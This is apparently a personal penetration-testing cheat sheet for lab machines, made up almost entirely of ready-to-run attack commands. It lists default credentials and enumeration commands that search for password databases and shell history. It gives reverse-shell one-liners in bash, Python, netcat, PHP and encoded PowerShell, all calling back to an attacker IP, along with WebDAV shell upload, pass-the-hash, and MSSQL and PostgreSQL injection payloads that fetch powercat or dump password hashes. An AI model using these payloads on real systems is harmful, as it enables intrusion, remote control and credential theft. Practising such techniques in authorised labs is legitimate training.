# Default Credentials
```bash
admin:admin
admin:password
admin:null
root:root
root:password
root:null
platform:platform
```

# Windows

## Enumeration
```bash
> whoami /priv
> systeminfo(OS NAME, OS VERSION)
> certutil -urlcache -f http://192.168.45.176/winPEAS.exe winPEAS.exe
> reg query "HKCU\Software\SimonTatham\PuTTY\Sessions" /s

# Modifiable services/executables
> sc qc service

# Scheduled tasks
> schtasks /query /fo LIST /v

# Search for juicy files
> type C:\Users\Administrator\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt
> type C:\Users\username\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt
> Get-History
> (Get-PSReadlineOption).HistorySavePath
> Get-ChildItem -Path C:\ -Include *.kdbx -File -Recurse -ErrorAction SilentlyContinue
> Get-ChildItem -Path C:\xampp -Include *.txt,*.ini -File -Recurse -ErrorAction SilentlyContinue
> Get-ChildItem -Path C:\Users -Include *.txt,*.ini,*.log,*.pdf,*.xls,*.xlsx,*.doc,*.docx -File -Recurse -ErrorAction SilentlyContinue
```


## Code Snippet to check where our code is executed
```bash
(dir 2>&1 *`|echo CMD);&<# rem #>echo PowerShell
(dir%202%3E%261%20*%60%7Cecho%20CMD)%3B%26%3C%23%20rem%20%23%3Eecho%20PowerShell
```


# HTTP/HTTPS(80,8080,8000,443...)

## wappalyzer

## gobuster
```bash
gobuster dir -u http://192.168.216.122/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x php,aspx,jsp,pdf
```

## feroxbuster (must add -x 
```bash
└─# feroxbuster -w /usr/share/seclists/Discovery/Web-Content/raft-medium-words.txt --url http://192.168.216.10/ -x php,aspx,jsp,pdf -C 404,401,403 -k
```


## nikto: find webdav, other vuln
```bash
nikto -h http://192.168.222.122
```


## cadaver(username,password required)
```bash
# first create a reverse shell(asp, aspx)
└─# msfvenom -p windows/x64/shell_reverse_tcp LHOST=192.168.45.176 LPORT=4444 -f aspx > shell.aspx

# connect to cadaver
cadaver http://10.3.20.218/webdav
put /root/offsec/shell.aspx
```

## exiftool
```bash
exiftool -a -u brochure.pdf
```

## wpscan: wordpress
```bash

```


## phpmyadmin: default password
- use default password(password can be null)
- upload php uploader: https://gist.github.com/BababaBlue/71d85a7182993f6b4728c5d6a77e669f
- upload simple-backdoor.php through SQL



# PORT 445: SMb
## crackmapexec smb
```bash
crackmapexec smb 192.168.216.165 -u 'enox' -p '' --shares
crackmapexec smb <% ["RHOST"] %> -u "" -p "" --pass-pol

```

## smbclient
```bash
smbclient \\\\192.168.161.31\\share -U 'Administrator' -N
smbclient \\\\192.168.50.212\\share -U Administrator --pw-nt-hash 7a38310ea6f0027ee955abed1762964b
```

## smbserver
```bash
sudo smbserver.py -smb2support share $(pwd) 
sudo smbserver.py -smb2support share $(pwd) -user kali -password kali

```


# PORT 389,3268: LDAP
## ldapsearch: focus on samaccount and description
```bash
# unauthenticated
ldapsearch -x -H ldap://192.168.216.122 -D 'hutch.offsec'  -b 'DC=hutch,DC=offsec'

# authenticated(LAPS found from SYSVOL)
ldapsearch -x -H 'ldap://192.168.216.122' -D 'hutch\fmcsorley' -w 'CrabSharkJellyfish192' -b 'dc=hutch,dc=offsec' "(ms-MCS-AdmPwd=*)" ms-MCS-AdmPwd
```


# SNMP(161)
```bash
snmpwalk -c public -v1 192.168.x.x
snmpwalk -v2c -c public 192.168.195.149 NET-SNMP-EXTEND-MIB::nsExtendObjects
```


## socat
```bash
sudo socat tcp-listen:135,reuseaddr,fork tcp:<victim.ip.add.ress>:9999
```


## NMAP
```bash
sudo nmap -A -p- -T4 192.168.245.145
sudo nmap -sU --open --top-ports 20 -sV 192.168.245.149

```

## Reverse shell
```bash
# bash
bash -i >& /dev/tcp/192.168.45.176/80 0>&1
bash -c 'bash -i >& /dev/tcp/192.168.45.176/80 0>&1'
bash%20-c%20%22bash%20-i%20%3E%26%20%2Fdev%2Ftcp%2F192.168.45.176%2F80%200%3E%261%22
echo -n '/bin/bash -c "bin/bash -i >& /dev/tcp/192.168.45.176/80 0>&1"' | base64

# python
python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("192.168.45.176",80));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'

python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("192.168.45.176",80));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'


#netcat reverse shell
nc -e /bin/sh 192.168.45.176 80

#PHP reverse shell
php -r '$sock=fsockopen("192.168.45.176",80);exec("/bin/sh -i <&3 >&3 2>&3");'


#Powershell
IEX (New-Object System.Net.Webclient).DownloadString("http://192.168.45.176/powercat.ps1");powercat -c 192.168.45.176 -p 4444 -e powershell


#Powershell: Create powershell reverse shell on kali linux
$ kali@kali:~$ pwsh

PS> $Text = '$client = New-Object System.Net.Sockets.TCPClient("192.168.119.3",4444);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + "PS " + (pwd).Path + "> ";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()'

PS> $Bytes = [System.Text.Encoding]::Unicode.GetBytes($Text)
PS> $EncodedText =[Convert]::ToBase64String($Bytes)
PS> $EncodedText

$powershell -enc $EncodedText

```

## curl
```bash
# GET Request
curl -i http://192.168.50.16:5002/users/v1/admin/password

# POST Request
curl -X POST --data 'Archive=git' http://192.168.50.189:8000/archive
curl -d '{"password":"fake","username":"admin"}' -H 'Content-Type: application/json'  http://192.168.50.16:5002/users/v1/login

# PUT Request
curl -X 'PUT' \
  'http://192.168.50.16:5002/users/v1/admin/password' \
  -H 'Content-Type: application/json' \
  -H 'Authorization: OAuth eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJleHAiOjE2NDkyNzE3OTQsImlhdCI6MTY0OTI3MTQ5NCwic3ViIjoib2Zmc2VjIn0.OeZH1rEcrZ5F0QqLb8IHbJI7f9KaRAkrywoaRUAsgA4' \
  -d '{"password": "pwned"}'
```

## File Download(When not working, make sure to use 80 and also try it without http://)
```bash
#certutil
certutil -urlcache -split -f http://192.168.45.176:8000/winPEAS.exe c:/users/public/winPEAS.exe

#wget
wget http://192.168.45.176:8000/rev.sh
wget -P /tmp/rev.sh http://192.168.45.176:8000/rev.sh


#powershell
iwr -uri http://192.168.45.176:8000/winPEAS.exe -outfile c:/users/public/winPEAS.exe

#curl
curl http://192.168.45.176/<FILE> > <OUTPUT_FILE>

```

# SSH
## SSH KEYGEN
```
kali@kali:~$ ssh-keygen
Generating public/private rsa key pair.
Enter file in which to save the key (/home/kali/.ssh/id_rsa): fileup
Enter passphrase (empty for no passphrase): 
Enter same passphrase again: 
Your identification has been saved in fileup
Your public key has been saved in fileup.pub
...

kali@kali:~$ cat fileup.pub > authorized_keys
```


# File Read Exploit
- If the server is running with NY SYSTEM or sudo(root), we can grab any files
- Check SSH Keys [id_rsa, id_ecdsa, id_ecdsa_sk, id_ed25519, id_ed25519_sk, id_dsa]
  - /home/username/{id_rsa}
  - /home/username/.ssh/{id_rsa}  
- find password files for other program that's running(for authenticated exploit that we can actually get reverse shell)
- /etc/passwd
- /etc/shadow
- /home/username/.bash_history
- /home/username/.bash_aliases

# SQLi
## mssql
```bash
';EXEC sp_configure 'show advanced options', 1;--
';RECONFIGURE;--
';EXEC sp_configure "xp_cmdshell", 1;--
';RECONFIGURE;--
';EXEC xp_cmdshell 'powershell.exe -nop -w hidden -c "IEX ((New-Object Net.WebClient).DownloadString(''http://192.168.45.176/powercat.ps1''))"; powercat -c 192.168.45.176 -p 4444 -e powershell'; --
```

## postgresql
```bash
' order by 7 -- //
' union select 1, 1, 1, 1, 1, 1 -- //
' union select 'd', 1, 1, 'd', 'd', null -- //

# Current user
' union select 'd', cast((SELECT concat('DATABASE: ',current_user)) as int), 1, 'd', 'd', null -- //

# Use cast to cause error to get the database
' union select 'd', cast((SELECT concat('DATABASE: ',current_database())) as int), 1, 'd', 'd', null -- //
## ERROR
<b>Warning</b>:  pg_query(): Query failed: ERROR:  invalid input syntax for type integer: &quot;DATABASE: glovedb&quot; in <b>/var/www/html/class.php</b> on line <b>423</b><br />

# Use case to find out tables
cast((SELECT table_name FROM information_schema.tables LIMIT 1 OFFSET data_offset) as int)


# Use cast to find out columns for each table
cast((SELECT column_name FROM information_schema.columns WHERE table_name='data_table' LIMIT 1 OFFSET data_offset) as int)


# Use cast to find out row for each column
cast((SELECT data_column FROM data_table LIMIT 1 OFFSET data_offset) as int)


# Get current user's password!
' union select 'd', cast((SELECT concat('DATABASE: ',passwd) FROM pg_shadow limit 1 offset 1) as int), 1, 'd', 'd', null -- //
```

## **CVE-2019–9193**
```bash

1) [Optional] Drop the table you want to use if it already exists

*DROP TABLE IF EXISTS cmd_exec;*

2) Create the table you want to hold the command output

*CREATE TABLE cmd_exec(cmd_output text);*

3) Run the system command via the COPY FROM PROGRAM function

*COPY cmd_exec FROM PROGRAM ‘id’;*

```bash
ex) COPY cmd_exec FROM PROGRAM 'nc 192.168.45.176 4444 -e /bin/bash'
```

4) [Optional] View the results

*SELECT * FROM cmd_exec;*

5) [Optional] Clean up after yourself

*DROP TABLE IF EXISTS cmd_exec;*
```
